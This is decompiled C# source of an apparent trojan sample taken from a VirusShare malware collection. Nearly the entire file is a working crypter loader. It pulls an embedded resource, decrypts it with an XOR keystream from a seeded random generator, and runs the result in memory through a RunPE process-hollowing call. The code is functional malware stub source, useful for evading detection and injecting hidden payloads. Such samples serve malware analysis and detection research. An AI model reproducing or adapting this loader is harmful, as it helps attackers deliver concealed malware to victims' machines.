// Decompiled with JetBrains decompiler
// Type: Cursor.Module1
// Assembly: Cursor, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B150258B-E423-436E-A699-590287945A17
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.MSIL.Inject.bq-cb05910e02cb9c65998c535063ecbe9f285f7a937d2791e860eb6799ad56067b.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Cursor
{
  [StandardModule]
  internal sealed class Module1
  {
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);

    [DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SizeofResource(IntPtr hModule, IntPtr hResInfo);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

    [STAThread]
    public static void Main()
    {
      string moduleName = Process.GetCurrentProcess().MainModule.ModuleName;
      IntPtr moduleHandle = Module1.GetModuleHandle(ref moduleName);
      IntPtr resource = Module1.FindResource(moduleHandle, "69", "GAY");
      IntPtr source = Module1.LoadResource(moduleHandle, resource);
      int length = Module1.SizeofResource(moduleHandle, resource);
      byte[] numArray = new byte[checked (length - 1 + 1)];
      Marshal.Copy(source, numArray, 0, length);
      int int32 = BitConverter.ToInt32(numArray, checked (numArray.Length - 4));
      byte[] bytes = (byte[]) Utils.CopyArray((Array) numArray, (Array) new byte[checked (numArray.Length - 3 + 1)]);
      Random random = new Random(int32);
      byte[] buffer = new byte[checked (bytes.Length - 1 + 1)];
      random.NextBytes(buffer);
      int num = checked (bytes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        bytes[index] = (byte) ((int) bytes[index] ^ (int) buffer[index]);
        checked { ++index; }
      }
      x86.RunPE(bytes, Process.GetCurrentProcess().MainModule.FileName);
    }
  }
}
